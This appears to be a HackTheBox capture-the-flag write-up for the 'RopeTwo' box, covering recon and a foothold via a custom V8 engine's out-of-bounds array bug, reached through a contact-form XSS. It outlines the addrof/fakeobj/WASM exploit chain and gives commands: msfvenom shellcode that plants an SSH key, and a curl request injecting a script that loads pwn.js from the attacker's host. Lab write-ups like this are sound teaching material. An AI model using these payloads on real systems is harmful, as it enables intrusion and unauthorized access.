## Overview

RopeTwo is an insane-difficulty Linux box that is pure exploit development from the first packet. There are no passwords to find anywhere — every step is a memory-corruption bug you weaponise yourself. The foothold abuses a **custom build of the V8 JavaScript engine** (the engine behind Chrome/Node) that ships two intentionally-broken array built-ins. A "Contact Us" form is read by a headless Chrome bot running that engine, so submitting a `<script>` tag turns the bot into the thing we exploit, ending in code execution as `chromeuser`.

> This post deliberately stops at the foothold shell. The user and root flags live behind a separate setuid heap bug and a kernel-module exploit, which are out of scope here.

## Recon

| Port | Service | Notes |

| 8000 | Werkzeug | "v8 dev" website with a contact form |
| 8060 | Nginx | — |

```bash
nmap -sC -sV 10.129.x.x
```

Port 8000 is a small "v8 dev" site that links to a GitLab repository of a custom V8 build, and exposes a **Contact Us** form. Port 5000 serves that GitLab.

## Enumeration

Two signals point the whole box:

1. The site advertises that it is developing a custom V8, and links the source on GitLab (port 5000).
2. The contact form's submitted message is opened by a headless browser — submitting `<img src=http://<lhost>/test>` produces a callback on a listener, and the request's `User-Agent` shows **Chrome**. The bot *is* a browser, and it runs the custom V8.

Looking at the GitLab repo's most recent commit reveals two new array built-ins:

- `GetLastElement` — returns the element at index `length` (arrays are valid only `0 .. length-1`, so this reads **one slot past** the array → out-of-bounds **read**).
- `SetLastElement` — writes at index `length` → out-of-bounds **write**.

That OOB read/write baked into the engine is the entire foothold primitive.

## Foothold

The exploit (`pwn.js`) turns the OOB primitive into full code execution:

1. Leak the float-array and object-array **maps**, then confuse them to build `addrof` (leak any object's address) and `fakeobj` (forge an object at an address).
2. Combine those into **arbitrary read and write**.
3. Create a WebAssembly instance — it owns a **read-write-execute** memory page — and find that page's address via the arbitrary read.
4. Redirect an `ArrayBuffer`'s backing-store pointer onto the RWX page and copy shellcode into it, then call the WASM export to execute it.

A practical gotcha: the public exploit allocates the shellcode buffer as `new ArrayBuffer(0x100)` (256 bytes). A real payload is larger, which makes `DataView.setUint32` throw out of range and the exploit silently does nothing — bump it to `0x1000`.

Host the exploit and deliver it through the contact form so the bot fetches and runs it:

```bash
# host the exploit; the box's headless Chrome will GET it
python3 -m http.server 8888 --bind <lhost>

# the bot has an empty $HOME, so use an absolute path; base64 the SSH key so
# spaces/+/ in the key don't break the remote shell quoting
msfvenom -p linux/x64/exec \
  CMD='bash -c "echo <b64_pubkey>|base64 -d > /home/chromeuser/.ssh/authorized_keys"' \
  --format dword   # paste these ints into pwn.js shellcode[]

# fire the XSS at the contact form — the bot renders it and runs pwn.js
curl -s -X POST http://10.129.x.x:8000/contact \
  --data-urlencode 'name=x' --data-urlencode 'subject=x' \
  --data-urlencode 'content=<script src=http://<lhost>:8888/pwn.js></script>'
```

Watch the `http.server` access log — when the box's IP fetches `pwn.js`, the bot has executed the exploit and dropped our key. Log in for a stable shell:

```bash
ssh -i c.rsa chromeuser@10.129.x.x
```

We have code execution as `chromeuser` — the browser engine itself was the target, not a victim's session.

## User flag

On RopeTwo the foothold user (`chromeuser`) is **not** the owner of `user.txt`; reaching it requires exploiting a setuid binary, which is beyond this post's recon→foothold scope.

```bash
# reached only after further (omitted) lateral movement
cat /home/r4j/user.txt   # HTB{...}
```
